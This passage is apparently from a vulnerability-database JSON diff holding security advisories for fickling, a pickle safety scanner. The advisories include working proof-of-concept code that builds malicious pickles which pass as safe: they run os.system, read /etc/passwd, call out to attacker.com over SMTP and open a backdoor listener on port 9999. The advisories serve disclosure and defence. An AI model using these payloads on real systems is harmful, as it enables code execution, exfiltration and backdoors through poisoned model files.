the\nbreak, so `_var0` correctly enters `used` and `UnusedVariables` stays silent.\n\nThe `__setstate__` call is excluded from `OvertlyBadEvals` because\n`ASTProperties.visit_Call` places it in `calls` but not in `non_setstate_calls`\n(line 562), and `OvertlyBadEvals` only iterates `non_setstate_calls`.\n\nThe `SMTP(...)` call is skipped by `OvertlyBadEvals` because `_process_import` adds\n`SMTP` to `likely_safe_imports` for any stdlib module (line 550), and `OvertlyBadEvals`\nskips calls whose function name is in `likely_safe_imports` (lines 339-345).\n\n**Net result: zero warnings, severity `LIKELY_SAFE`.**\n\nThis flaw is generic -- it applies to any module not on the blocklist, not just the\nsix fixed in PR #233. Any future blocklist gap can be silently exploited using the\nsame `REDUCE + EMPTY_DICT + BUILD` pattern as long as this flaw remains unpatched.\n\n### Bypass opcode sequence\n\n```\nOffset  Opcode            Argument\n------  ------            --------\n0       PROTO             4\n2       GLOBAL            'smtplib' 'SMTP'\n16      SHORT_BINUNICODE  'attacker.com'\n30      BININT2           25\n33      TUPLE2\n34      REDUCE                          <- TCP connection opened here\n35      EMPTY_DICT\n36      BUILD                           <- suppresses UnusedVariables via flaw\n37      STOP\n```\n\nFickling's synthetic AST for this sequence (what all analysis passes inspect):\n\n```python\nfrom smtplib import SMTP\n_var0 = SMTP('attacker.com', 25)\n_var1 = _var0\n_var1.__setstate__({})\nresult = _var1\n```\n\nNo analysis rule in fickling fires on this AST.\n\n### Proof of Concept\n\nRequires only `pip install fickling`. Save as `poc.py` and run.\n\n```python\nimport socket\nimport threading\nimport pickle\n\ndef build_bypass_pickle(host: str, port: int) -> bytes:\n    h = host.encode(\"utf-8\")\n    return b\"\".join([\n        b\"\\x80\\x04\",\n        b\"csmtplib\\nSMTP\\n\",\n        b\"\\x8c\" + bytes([len(h)]) + h,\n        b\"M\" + bytes([port & 0xFF, (port >> 8) & 0xFF]),\n        b\"\\x86\",   # TUPLE2\n        b\"R\",      # REDUCE\n        b\"}\",      # EMPTY_DICT\n        b\"b\",      # BUILD\n        b\".\",      # STOP\n    ])\n\ndef run_poc():\n    from fickling.analysis import check_safety\n    from fickling.fickle import Pickled\n\n    HOST, PORT = \"127.0.0.1\", 19902\n    received = []\n\n    def listener():\n        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        srv.bind((HOST, PORT))\n        srv.listen(1)\n        srv.settimeout(5)\n        try:\n            conn, addr = srv.accept()\n            received.append(addr)\n            conn.close()\n        except socket.timeout:\n            pass\n        srv.close()\n\n    t = threading.Thread(target=listener, daemon=True)\n    t.start()\n\n    raw = build_bypass_pickle(HOST, PORT)\n    loaded = Pickled.load(raw)\n    result = check_safety(loaded)\n\n    print(f\"[*] fickling severity : {result.severity.name}\")\n    print(f\"[*] fickling is_safe  : {result.severity.name == 'LIKELY_SAFE'}\")\n\n    assert result.severity.name == \"LIKELY_SAFE\", \"Bypass failed\"\n    print(\"[+] fickling rates the pickle as LIKELY_SAFE  <-- bypass confirmed\")\n\n    print(\"[*] Calling pickle.loads() to simulate victim loading the file...\")\n    try:\n        pickle.loads(raw)\n    except Exception:\n        pass\n\n    t.join(timeout=5)\n\n    if received:\n        print(f\"[+] Incoming TCP connection received from {received[0]}\")\n        print(\"[+] FULL BYPASS CONFIRMED: outbound connection made while fickling reported LIKELY_SAFE\")\n    else:\n        print(\"[-] No TCP connection received (network blocked)\")\n        print(\"    fickling still rated LIKELY_SAFE -- static analysis bypass confirmed regardless\")\n\nif __name__ == \"__main__\":\n    run_poc()\n```\n\n### Expected output\n\n```\n[*] fickling severity : LIKELY_SAFE\n[*] fickling is_safe  : True\n[+] fickling rates the pickle as LIKELY_SAFE  <-- bypass confirmed\n[*] Calling pickle.loads() to simulate victim loading the file...\n[+] Incoming TCP connection received from ('127.0.0.1', 58412)\n[+] FULL BYPASS CONFIRMED: outbound connection made while fickling reported LIKELY_SAFE\n```\n\nTested on Python 3.11.1, Windows. Not OS-specific.\n\n### Impact\n\nAn attacker distributing a malicious pickle file (e.g. a crafted ML model checkpoint)\ncan silently:\n\n- **Enumerate victims** -- receive a TCP callback every time the pickle is loaded,\n  including in sandboxed environments\n- **Exfiltrate host identity** -- victim IP, hostname (via SMTP EHLO), and service\n  banners are sent to the attacker's server\n- **Probe internal services (SSRF)** -- if the victim host can reach internal SMTP\n  relays, IMAP stores, or FTP servers, the pickle probes those services on the\n  attacker's behalf\n- **Establish a covert channel** -- protocol handshakes carry attacker-controlled\n  bytes through a channel fickling explicitly labels safe\n\nThe `is_likely_safe()` helper (`fickling/analysis.py:468-474`) and the `--check-safety`\nCLI flag both gate on `severity == LIKELY_SAFE`. This bypass clears that gate\ncompletely with zero warnings.\n\n### Suggested fix\n\nWalk `statement.value` before the `break` so variables referenced only in the result\nassignment are correctly counted as used:\n\n```python\n# fickling/fickle.py:1183 -- suggested fix\nif (\n    len(statement.targets) == 1\n    and isinstance(statement.targets[0], ast.Name)\n    and statement.targets[0].id == \"result\"\n):\n    # scan RHS before breaking so variables used only here are marked as used\n    for node in ast.walk(statement.value):\n        if isinstance(node, ast.Name):\n            used.add(node.id)\n    break\n```\n\nThis is the same pattern already used for every other statement in the loop\n(lines 1200-1203). All 55 non-torch tests pass with this fix applied.\n\n---\n\n## Affected versions\n\nAll releases including `v0.1.7` (latest). Confirmed on latest `master` as of\n2026-02-19. Root cause 1 patched in PR #233 (master only, not yet released).\nRoot cause 2 unpatched as of this report.\n\n## Reporter\n\nAnmol Vats",
+      "published": "2026-02-20T18:24:46Z",
+      "modified": "2026-02-23T23:43:48.613965Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-83pf-v6qq-pwmr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/233"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/6d20564d23acf14b42ec883908aed159be7b9ade"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-83pf-v6qq-pwmr",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.8"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7"
+      ]
+    },
+    {
+      "id": "GHSA-h4rm-mm56-xf63",
+      "primary_id": "CVE-2026-22612",
+      "aliases": [
+        "CVE-2026-22612"
+      ],
+      "cve_ids": [
+        "CVE-2026-22612"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling vulnerable to detection bypass due to \"builtins\" blindness",
+      "details": "#Fickling's assessment\n\nFickling started emitting AST nodes for builtins imports in order to match them during analysis (https://github.com/trailofbits/fickling/commit/9f309ab834797f280cb5143a2f6f987579fa7cdf). \n\n# Original report\n\n### Summary\nFickling works by\nPickle bytecode --> AST --> Security analysis\nHowever while going from bytecode to AST, some import nodes are removed which blinds the security analysis\n\nfickling/fickling/fickle.py\n```python\n    def run(self, interpreter: Interpreter):\n        module, attr = self.module, self.attr\n        if module in (\"__builtin__\", \"__builtins__\", \"builtins\"):\n            # no need to emit an import for builtins!\n            pass\n        else:\n            alias = ast.alias(attr)\n            interpreter.module_body.append(ast.ImportFrom(module=module, names=[alias], level=0))\n        interpreter.stack.append(ast.Name(attr, ast.Load()))\n\n    def encode(self) -> bytes:\n        return f\"c{self.module}\\n{self.attr}\\n\".encode()\n```\nHere we see that no import nodes are emitted for builtins\nHowever builtins is marked as an unsafe import\n\nfickling/fickling/analysis.py\n```python\nUNSAFE_MODULES = {\n        \"__builtin__\": \"This module contains dangerous functions that can execute arbitrary code.\",\n        \"__builtins__\": \"This module contains dangerous functions that can execute arbitrary code.\",\n        \"builtins\": \"This module contains dangerous functions that can execute arbitrary code.\",\n```\n\nBut because there are no import nodes for builtins (they werent emitted when making the AST), the security scanner is effectively blind.\n\nThis can allow for security bypasses like this\n\npoc.py (script to create payload)\n```python\nimport os\n\nGLOBAL = b'c'    # Import module.name\nSTRING = b'S'    # Push string\nTUPLE1 = b'\\x85' # Build tuple of 1\nTUPLE2 = b'\\x86' # Build tuple of 2\nEMPTY_TUPLE = b')'\nREDUCE = b'R'    # Call function\nPUT    = b'p'    # Memoize (Variable assignment)\nGET    = b'g'    # Load from memo (Variable usage)\nPOP    = b'0'    # Discard top of stack\nEMPTY_DICT = b'}'\nSETITEM = b's'   # Add key/value to dict\nBUILD  = b'b'    # Update object state (Liveness satisfy)\nSTOP   = b'.'    # Finish and return stack top\n\ndef generate_raw_payload():\n    payload = b\"\"\n\n    payload += GLOBAL + b\"builtins\\n__import__\\n\"\n    payload += STRING + b\"'os'\\n\"\n    payload += TUPLE1 + REDUCE\n    payload += PUT + b\"0\\n\" # _var0 = os module\n    payload += POP\n\n    payload += GLOBAL + b\"builtins\\ngetattr\\n\"\n    payload += GET + b\"0\\n\" # os module\n    payload += STRING + b\"'system'\\n\"\n    payload += TUPLE2 + REDUCE\n    payload += PUT + b\"1\\n\" # _var1 = os.system\n    payload += POP\n\n    payload += GET + b\"1\\n\" # os.system\n    payload += STRING + b\"'whoami'\\n\" # COMMAND\n    payload += TUPLE1 + REDUCE\n    payload += PUT + b\"2\\n\" \n    payload += POP\n\n    payload += GLOBAL + b\"builtins\\nException\\n\"\n    payload += EMPTY_TUPLE + REDUCE\n    payload += PUT + b\"3\\n\"\n    \n    payload += EMPTY_DICT\n    payload += STRING + b\"'rce_status'\\n\"\n    payload += GET + b\"2\\n\" \n    payload += SETITEM  \n    \n    payload += BUILD\n    \n    payload += STOP\n\n    return payload\n\nif __name__ == \"__main__\":\n    data = generate_raw_payload()\n    with open(\"raw_bypass.pkl\", \"wb\") as f:\n        f.write(data)\n    \n    print(\"Generated 'raw_bypass.pkl'\")\n```\n\nThis creates a pickle file which imports the OS module using __import__ which is a part of builtins. if the security scanner wasnt blinded it would have been flagged immidiately.\n\nHowever now fickling sees the pickle payload as\n\n```python\n_var0 = __import__('os')\n_var1 = getattr(_var0, 'system')\n_var2 = _var1('whoami')\n_var3 = Exception()\n_var4 = _var3\n_var4.__setstate__({'rce_status': _var2})\nresult0 = _var4\n```\n\n<img width=\"810\" height=\"182\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5bfe8c34-7bc0-429f-83ce-d0c2f1928aca\" />\n\n\nAs you can see there is no mention of builtins anywhere so it isnt flagged\n\nAdditionally, the payload builder uses a technique to ensure that no variable get flagged as \"UNUSED\"\nWe deceive the data flow analysis heuristic by using the BUILD opcode to update an objects internal state. \nBy taking the result of os.system (the exit code) and using it as a value in a dictionary that is then \"built\" into a returned exception object, we create a logical dependency chain.\n\nThe end result is that the malicious pickle gets classified as LIKELY_SAFE\n\nFixes: \nEnsure that import objects are emitted for imports from builtins depending on what those imports are, say emit import nodes for dangerous functions like ```__import__``` while not emitting for stuff like ```dict()```",
+      "published": "2026-01-09T22:29:02Z",
+      "modified": "2026-02-03T03:16:10.705531Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-h4rm-mm56-xf63"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22612"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/195"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/9f309ab834797f280cb5143a2f6f987579fa7cdf"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L349"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.7"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-h4rm-mm56-xf63",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ]
+    },
+    {
+      "id": "GHSA-mhc9-48gj-9gp3",
+      "primary_id": "GHSA-mhc9-48gj-9gp3",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling has safety check bypass via REDUCE+BUILD opcode sequence",
+      "details": "# Assessment\n\nIt is believed that the analysis pass works as intended, `REDUCE` and `BUILD` are not at fault here. The few potentially unsafe modules have been added to the blocklist (https://github.com/trailofbits/fickling/commit/0c4558d950daf70e134090573450ddcedaf10400).\n\n# Original report\n\n### Summary\nAll 5 of fickling's safety interfaces \u2014 `is_likely_safe()`, `check_safety()`, CLI `--check-safety`, `always_check_safety()`, and the `check_safety()` context manager \u2014 report `LIKELY_SAFE` / raise no exceptions for pickle files that call dangerous top-level stdlib functions (signal handlers, network servers, network connections, file operations) when the REDUCE opcode is followed by a BUILD opcode. Demonstrated impacts include backdoor network listeners (`socketserver.TCPServer`), process persistence (`signal.signal`), outbound data exfiltration (`smtplib.SMTP`), and file creation on disk (`sqlite3.connect`). An attacker can append a trivial BUILD opcode to any payload to eliminate all detection.\n\n## Details\n\nThe bypass exploits three weaknesses in fickling's static analysis pipeline:\n\n1. **`likely_safe_imports` over-inclusion** (`fickle.py:432-435`): When fickling decompiles a pickle and encounters `from smtplib import SMTP`, it adds `\"SMTP\"` to the `likely_safe_imports` set because `smtplib` is a Python stdlib module. This happens for ALL stdlib modules, including dangerous ones like smtplib, ftplib, sqlite3, etc.\n\n2. **`OvertlyBadEvals` exemption** (`analysis.py:301-310`): The main call-level safety checker skips any call where the function name is in `likely_safe_imports`. So `SMTP('attacker.com')` is never flagged.\n\n3. **`__setstate__` exclusion** (`fickle.py:443-446`): BUILD generates a `__setstate__` call which is excluded from the `non_setstate_calls` list. This means BUILD's call is invisible to `OvertlyBadEvals`. Additionally, BUILD consumes the REDUCE result variable, which prevents the `UnusedVariables` checker from flagging the unused assignment (the only remaining detection mechanism).\n\n### Affected versions\n\nAll versions through 0.1.7 (latest as of 2026-02-18).\n\n### Affected APIs\n\n- `fickling.is_likely_safe()` - returns `True` for bypass payloads\n- `fickling.analysis.check_safety()` - returns `AnalysisResults` with `severity = Severity.LIKELY_SAFE`\n- `fickling --check-safety` CLI - exits with code 0\n- `fickling.always_check_safety()` + `pickle.load()` - no `UnsafeFileError` raised, malicious code executes\n- `fickling.check_safety()` context manager + `pickle.load()` - no `UnsafeFileError` raised, malicious code executes\n\n\n\n## PoC\n\nA single pickle that reads `/etc/passwd` AND opens a network connection to an attacker's server, yet fickling reports it as `LIKELY_SAFE`:\n\n```python\nimport io, struct, tempfile, os\n\ndef sbu(s):\n    \"\"\"SHORT_BINUNICODE opcode helper.\"\"\"\n    b = s.encode()\n    return b\"\\x8c\" + struct.pack(\"<B\", len(b)) + b\n\ndef make_exfiltration_pickle():\n    \"\"\"\n    Single pickle that:\n      1. Reads /etc/passwd via fileinput.input()\n      2. Opens TCP connection to attacker via smtplib.SMTP()\n    Both operations pass as LIKELY_SAFE.\n    \"\"\"\n    buf = io.BytesIO()\n    buf.write(b\"\\x80\\x04\\x95\")  # PROTO 4 + FRAME\n    payload = io.BytesIO()\n\n    # --- Operation 1: Read /etc/passwd ---\n    payload.write(sbu(\"fileinput\") + sbu(\"input\") + b\"\\x93\")  # STACK_GLOBAL\n    payload.write(sbu(\"/etc/passwd\") + b\"\\x85\")                # arg + TUPLE1\n    payload.write(b\"R\")                                         # REDUCE\n    payload.write(b\"}\" + sbu(\"_x\") + sbu(\"y\") + b\"s\" + b\"b\")  # BUILD\n    payload.write(b\"0\")                                         # POP (discard result)\n\n    # --- Operation 2: Connect to attacker ---\n    payload.write(sbu(\"smtplib\") + sbu(\"SMTP\") + b\"\\x93\")     # STACK_GLOBAL\n    payload.write(sbu(\"attacker.com\") + b\"\\x85\")               # arg + TUPLE1\n    payload.write(b\"R\")                                         # REDUCE\n    payload.write(b\"}\" + sbu(\"_x\") + sbu(\"y\") + b\"s\" + b\"b\")  # BUILD\n    payload.write(b\".\")                                         # STOP\n\n    frame_data = payload.getvalue()\n    buf.write(struct.pack(\"<Q\", len(frame_data)))\n    buf.write(frame_data)\n    return buf.getvalue()\n\n# Generate and test\ndata = make_exfiltration_pickle()\nwith open(\"/tmp/exfil.pkl\", \"wb\") as f:\n    f.write(data)\n\nimport fickling\nprint(fickling.is_likely_safe(\"/tmp/exfil.pkl\"))\n# Output: True  <-- BYPASSED (file read + network connection in one pickle)\n```\n\nfickling decompiles this to:\n```python\nfrom fileinput import input\n_var0 = input('/etc/passwd')       # reads /etc/passwd\n_var1 = _var0\n_var1.__setstate__({'_x': 'y'})\nfrom smtplib import SMTP\n_var2 = SMTP('attacker.com')       # opens TCP connection to attacker\n_var3 = _var2\n_var3.__setstate__({'_x': 'y'})\nresult = _var3\n```\n\nYet reports `LIKELY_SAFE` because every call is either in `likely_safe_imports` (skipped) or is `__setstate__` (excluded).\n\n**CLI verification:**\n```bash\n$ fickling --check-safety /tmp/exfil.pkl; echo \"EXIT: $?\"\nEXIT: 0    # BYPASSED - file read + network access passes as safe\n```\n\n**`always_check_safety()` verification:**\n```python\nimport fickling, pickle\n\nfickling.always_check_safety()\n\n# This should raise UnsafeFileError for malicious pickles, but doesn't:\nwith open(\"/tmp/exfil.pkl\", \"rb\") as f:\n    result = pickle.load(f)\n# No exception raised \u2014 malicious code executed successfully\n```\n\n**`check_safety()` context manager verification:**\n```python\nimport fickling, pickle\n\nwith fickling.check_safety():\n    with open(\"/tmp/exfil.pkl\", \"rb\") as f:\n        result = pickle.load(f)\n# No exception raised \u2014 malicious code executed successfully\n```\n\n### Backdoor listener PoC (most impactful)\n\nA pickle that opens a TCP listener on port 9999, binding to all interfaces:\n\n```python\nimport io, struct\n\ndef sbu(s):\n    b = s.encode()\n    return b\"\\x8c\" + struct.pack(\"<B\", len(b)) + b\n\ndef make_backdoor_listener():\n    buf = io.BytesIO()\n    buf.write(b\"\\x80\\x04\\x95\")  # PROTO 4 + FRAME\n    payload = io.BytesIO()\n\n    # socketserver.TCPServer via STACK_GLOBAL\n    payload.write(sbu(\"socketserver\") + sbu(\"TCPServer\") + b\"\\x93\")\n\n    # Address tuple ('0.0.0.0', 9999) - needs MARK+TUPLE for mixed types\n    payload.write(b\"(\")                                    # MARK\n    payload.write(sbu(\"0.0.0.0\"))                          # host string\n    payload.write(b\"J\" + struct.pack(\"<i\", 9999))          # BININT port\n    payload.write(b\"t\")                                    # TUPLE\n\n    # Handler class via STACK_GLOBAL\n    payload.write(sbu(\"socketserver\") + sbu(\"BaseRequestHandler\") + b\"\\x93\")\n\n    payload.write(b\"\\x86\")  # TUPLE2 -> (address, handler)\n    payload.write(b\"R\")     # REDUCE -> TCPServer(address, handler)\n    payload.write(b\"N\")     # NONE\n    payload.write(b\"b\")     # BUILD(None) -> no-op\n    payload.write(b\".\")     # STOP\n\n    frame_data = payload.getvalue()\n    buf.write(struct.pack(\"<Q\", len(frame_data)))\n    buf.write(frame_data)\n    return buf.getvalue()\n\nimport fickling, pickle, socket\ndata = make_backdoor_listener()\nwith open(\"/tmp/backdoor.pkl\", \"wb\") as f:\n    f.write(data)\n\nprint(fickling.is_likely_safe(\"/tmp/backdoor.pkl\"))\n# Output: True  <-- BYPASSED\n\nserver = pickle.loads(data)\n# Port 9999 is now LISTENING on all interfaces\n\ns = socket.socket()\ns.connect((\"127.0.0.1\", 9999))\nprint(\"Connected to backdoor port!\")  # succeeds\ns.close()\nserver.server_close()\n```\n\nThe TCPServer constructor calls `server_bind()` and `server_activate()` (which calls `listen()`), so the port is open and accepting connections immediately after `pickle.loads()` returns.\n\n## Impact\n\nAn attacker can distribute a malicious pickle file (e.g., a backdoored ML model) that passes all fickling safety checks. Demonstrated impacts include:\n\n- **Backdoor network listener**: `socketserver.TCPServer(('0.0.0.0', 9999), BaseRequestHandler)` opens a port on all interfaces, accepting connections from the network. The TCPServer constructor calls `server_bind()` and `server_activate()`, so the port is open immediately after `pickle.loads()` returns.\n- **Process persistence**: `signal.signal(SIGTERM, SIG_IGN)` makes the process ignore SIGTERM. In Kubernetes/Docker/ECS, the orchestrator cannot gracefully shut down the process \u2014 the backdoor stays alive for 30+ seconds per restart attempt.\n- **Outbound exfiltration channels**: `smtplib.SMTP('attacker.com')`, `ftplib.FTP('attacker.com')`, `imaplib.IMAP4('attacker.com')`, `poplib.POP3('attacker.com')` open outbound TCP connections. The attacker's server sees the connection and learns the victim's IP and hostname.\n- **File creation on disk**: `sqlite3.connect(path)` creates a file at an attacker-chosen path as a side effect of the constructor.\n- **Additional bypassed modules**: glob.glob, fileinput.input, pathlib.Path, compileall.compile_file, codeop.compile_command, logging.getLogger, zipimport.zipimporter, threading.Thread\n\nA single pickle can combine all of the above (signal suppression + backdoor listener + network callback + file creation) into one payload. In a cloud ML environment, this enables persistent backdoor access while resisting graceful shutdown. 15 top-level stdlib modules bypass detection when BUILD is appended.\n\nThis affects any application using fickling as a safety gate for ML model files.\n\n## Suggested Fix\n\nRestrict `likely_safe_imports` to a curated allowlist of known-safe modules instead of trusting all stdlib modules. Additionally, either remove the `OvertlyBadEvals` exemption for `likely_safe_imports` or expand the `UNSAFE_IMPORTS` blocklist to cover network/file/compilation modules.\n\n## Relationship to GHSA-83pf-v6qq-pwmr\n\nGHSA-83pf-v6qq-pwmr (Low, 2026-02-19) reports 6 network-protocol modules missing from the blocklist. Adding those modules to `UNSAFE_IMPORTS` does NOT fix this vulnerability because the root cause is the `OvertlyBadEvals` exemption for `likely_safe_imports` (`analysis.py:304-310`), which skips calls to ANY stdlib function \u2014 not just those 6 modules. Our 15 tested bypass modules include `socketserver`, `signal`, `sqlite3`, `threading`, `compileall`, and others beyond the scope of that advisory.",
+      "published": "2026-02-25T15:24:18Z",
+      "modified": "2026-02-25T15:32:49.062084Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-mhc9-48gj-9gp3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/0c4558d950daf70e134090573450ddcedaf10400"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/advisories/GHSA-83pf-v6qq-pwmr"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-mhc9-48gj-9gp3",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.8"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7"
+      ]
+    },
+    {
+      "id": "GHSA-mxhj-88fx-4pcv",
+      "primary_id": "GHSA-mxhj-88fx-4pcv",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling: OBJ opcode call invisibility bypasses all safety checks",
+      "details": "# Assessment\n\nThe interpreter so it behaves closer to CPython when dealing with `OBJ`, `NEWOBJ`, and `NEWOBJ_EX` opcodes (https://github.com/trailofbits/fickling/commit/ff423dade2bb1f72b2b48586c022fac40cbd9a4a).\n\n# Original report\n\n## Summary\n\nAll 5 of fickling's safety interfaces -- `is_likely_safe()`, `check_safety()`, CLI `--check-safety`, `always_check_safety()`, and the `check_safety()` context manager -- report `LIKELY_SAFE` / raise no exceptions for pickle files that use the OBJ opcode to call dangerous stdlib functions (signal handlers, network servers, network connections, file operations). The OBJ opcode's implementation in fickling pushes function calls directly onto the interpreter stack without persisting them to the AST via `new_variable()`. When the result is discarded with POP, the call vanishes from the final AST entirely, making it invisible to all 9 analysis passes.\n\nThis is a separate vulnerability from the REDUCE+BUILD bypass, with a different root cause. It survives all three proposed fixes for the REDUCE+BUILD vulnerability.\n\n## Details\n\nThe vulnerability is a single missing `new_variable()` call in `Obj.run()` (`fickle.py:1333-1350`).\n\n**REDUCE** (`fickle.py:1286-1301`) correctly persists calls to the AST:\n```python\n# Line 1300: call IS saved to module_body\nvar_name = interpreter.new_variable(call)\ninterpreter.stack.append(ast.Name(var_name, ast.Load()))\n```\n\nThe comment on lines 1296-1299 explicitly states: \"if we just save it to the stack, then it might not make it to the final AST unless the stack value is actually used.\"\n\n**OBJ** (`fickle.py:1333-1350`) does exactly what that comment warns against:\n```python\n# Line 1348: call is ONLY on the stack, NOT in module_body\ninterpreter.stack.append(ast.Call(kls, args, []))\n```\n\nWhen the OBJ result is discarded by POP, the `ast.Call` is gone. The decompiled AST shows the import but no function call:\n```python\nfrom smtplib import SMTP    # import present (from STACK_GLOBAL)\nresult = None              # no call to SMTP visible\n```\n\nYet at runtime, `SMTP('127.0.0.1')` executes and opens a TCP connection.\n\n**NEWOBJ** (`fickle.py:1411-1420`) and **NEWOBJ_EX** (`fickle.py:1423-1433`) have the same code pattern but are less exploitable since CPython's NEWOBJ calls `cls.__new__()` (allocation only) while OBJ calls `cls(*args)` (full constructor execution with `__init__` side effects).\n\n### Affected versions\n\nAll versions through 0.1.7 (latest as of 2026-02-19).\n\n### Affected APIs\n\n- `fickling.is_likely_safe()` - returns `True` for bypass payloads\n- `fickling.analysis.check_safety()` - returns `AnalysisResults` with `severity = Severity.LIKELY_SAFE`\n- `fickling --check-safety` CLI - exits with code 0\n- `fickling.always_check_safety()` + `pickle.load()` - no `UnsafeFileError` raised, malicious code executes\n- `fickling.check_safety()` context manager + `pickle.load()` - no `UnsafeFileError` raised, malicious code executes\n\n## PoC\n\nA pickle that opens a TCP connection to an attacker's server via OBJ+POP, yet fickling reports it as `LIKELY_SAFE`:\n\n```python\nimport io, struct\n\ndef sbu(s):\n    \"\"\"SHORT_BINUNICODE opcode helper.\"\"\"\n    b = s.encode()\n    return b\"\\x8c\" + struct.pack(\"<B\", len(b)) + b\n\ndef make_obj_pop_bypass():\n    \"\"\"\n    Pickle that calls smtplib.SMTP('127.0.0.1') at runtime,\n    but the call is invisible to fickling.\n\n    Opcode sequence:\n        MARK\n          STACK_GLOBAL 'smtplib' 'SMTP'   (import persisted to AST)\n          SHORT_BINUNICODE '127.0.0.1'    (argument)\n        OBJ                               (call SMTP('127.0.0.1'), push result)\n                                          (ast.Call on stack only, NOT in AST)\n        POP                               (discard result -> call GONE)\n        NONE\n        STOP\n    \"\"\"\n    buf = io.BytesIO()\n    buf.write(b\"\\x80\\x04\\x95\")  # PROTO 4 + FRAME\n\n    payload = io.BytesIO()\n    payload.write(b\"(\")                              # MARK\n    payload.write(sbu(\"smtplib\") + sbu(\"SMTP\"))      # push module + func strings\n    payload.write(b\"\\x93\")                            # STACK_GLOBAL\n    payload.write(sbu(\"127.0.0.1\"))                   # push argument\n    payload.write(b\"o\")                               # OBJ: call SMTP('127.0.0.1')\n    payload.write(b\"0\")                               # POP: discard result\n    payload.write(b\"N.\")                              # NONE + STOP\n\n    frame_data = payload.getvalue()\n    buf.write(struct.pack(\"<Q\", len(frame_data)))\n    buf.write(frame_data)\n    